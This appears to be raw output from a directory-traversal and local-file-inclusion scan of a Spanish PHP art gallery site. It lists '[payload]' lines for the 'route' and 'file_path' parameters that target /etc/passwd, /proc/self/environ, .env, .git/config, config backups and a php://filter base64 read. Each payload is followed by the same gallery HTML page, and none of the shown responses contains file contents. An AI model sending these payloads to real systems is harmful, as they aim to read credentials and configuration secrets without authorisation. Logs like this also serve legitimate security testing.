        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] route=../../../../../../../..//etc/hosts
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] route=../../../../../../../..//proc/self/environ
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] route=../../../../../../../../.env
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] route=../../../../../../../../.git/config
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] route=../../../../../../../../config.php.bak
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] route=../../../../../../../../backup.zip
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] route=php://filter/read=convert.base64-encode/resource=/etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
-- Testing parameter: file_path
[payload] file_path=../../../../../../../..//etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] file_path=../../../../../../../..//etc/hosts
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] file_path=../../../../../../../..//proc/self/environ
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
